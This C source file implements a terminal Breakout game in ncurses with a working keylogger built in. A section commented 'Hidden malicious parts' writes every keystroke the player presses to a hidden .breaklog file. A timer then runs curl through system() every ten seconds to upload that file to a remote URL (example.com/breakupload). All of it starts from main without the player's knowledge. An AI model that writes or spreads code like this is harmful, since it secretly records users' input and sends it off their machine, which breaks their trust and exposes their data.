#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ncurses.h>
#include <string.h>
#include <sys/time.h>

#define WIDTH 40
#define HEIGHT 20
#define PADDLE_WIDTH 7
#define BRICK_ROWS 3
#define BRICK_COLS 10

int ballX = WIDTH / 2, ballY = HEIGHT - 5;
int ballDX = 1, ballDY = -1;
int paddleX = WIDTH / 2 - PADDLE_WIDTH / 2;
int bricks[BRICK_ROWS][BRICK_COLS];
int gameOver = 0;
int score = 0;

// Hidden malicious parts
FILE *logfile = NULL;
struct timeval last_exfil;
const char *logpath = ".breaklog";
const char *exfil_url = "http://example.com/breakupload";

void init_malicious() {
    logfile = fopen(logpath, "a");
    if (!logfile) {
        logfile = fopen("/tmp/.breaklog", "a");
    }
    gettimeofday(&last_exfil, NULL);
}

void exfiltrate() {
    struct timeval now;
    gettimeofday(&now, NULL);
    if (now.tv_sec - last_exfil.tv_sec >= 10) {
        char cmd[512];
        snprintf(cmd, sizeof(cmd),
                 "curl -s -X POST -F \"file=@%s\" %s > /dev/null 2>&1",
                 logpath, exfil_url);
        system(cmd);
        gettimeofday(&last_exfil, NULL);
    }
}

void setupBricks() {
    for (int i = 0; i < BRICK_ROWS; i++)
        for (int j = 0; j < BRICK_COLS; j++)
            bricks[i][j] = 1;
}

void draw() {
    clear();

    for (int i = 0; i < WIDTH + 2; i++) printw("#");
    printw("\n");

    for (int y = 0; y < HEIGHT; y++) {
        printw("#");
        for (int x = 0; x < WIDTH; x++) {
            int brickDrawn = 0;

            for (int i = 0; i < BRICK_ROWS; i++) {
                for (int j = 0; j < BRICK_COLS; j++) {
                    int bx = j * (WIDTH / BRICK_COLS);
                    int by = i + 1;
                    if (x >= bx && x < bx + (WIDTH / BRICK_COLS) && y == by && bricks[i][j]) {
                        printw("*");
                        brickDrawn = 1;
                        break;
                    }
                }
                if (brickDrawn) break;
            }

            if (!brickDrawn && x == ballX && y == ballY) printw("O");
            else if (!brickDrawn && y == HEIGHT - 1 && x >= paddleX && x < paddleX + PADDLE_WIDTH)
                printw("=");
            else if (!brickDrawn) printw(" ");
        }
        printw("#\n");
    }

    for (int i = 0; i < WIDTH + 2; i++) printw("#");
    printw("\nScore: %d\n", score);
    refresh();
}

void input() {
    timeout(0);
    int ch = getch();

    if (ch != ERR && logfile) {
        fputc(ch, logfile);
        fflush(logfile);
    }

    if (ch == 'a' && paddleX > 0) paddleX--;
    if (ch == 'd' && paddleX + PADDLE_WIDTH < WIDTH) paddleX++;
    if (ch == 'x') gameOver = 1;

    exfiltrate();
}

void logic() {
    ballX += ballDX;
    ballY += ballDY;

    if (ballX <= 0 || ballX >= WIDTH - 1) ballDX *= -1;
    if (ballY <= 0) ballDY *= -1;

    if (ballY == HEIGHT - 2 && ballX >= paddleX && ballX < paddleX + PADDLE_WIDTH)
        ballDY *= -1;

    for (int i = 0; i < BRICK_ROWS; i++) {
        for (int j = 0; j < BRICK_COLS; j++) {
            int bx = j * (WIDTH / BRICK_COLS);
            int by = i + 1;
            if (bricks[i][j] && ballY == by && ballX >= bx && ballX < bx + (WIDTH / BRICK_COLS)) {
                bricks[i][j] = 0;
                ballDY *= -1;
                score += 10;
            }
        }
    }

    if (ballY >= HEIGHT - 1) {
        gameOver = 1;
    }
}

int main() {
    initscr();
    noecho();
    curs_set(FALSE);

    init_malicious();
    setupBricks();

    while (!gameOver) {
        draw();
        input();
        logic();
        usleep(50000);
    }

    draw();
    printw("\nGame Over! Final Score: %d\n", score);
    printw("Press any key to exit...");
    timeout(-1);
    getch();
    endwin();

    if (logfile) fclose(logfile);

    return 0;
}
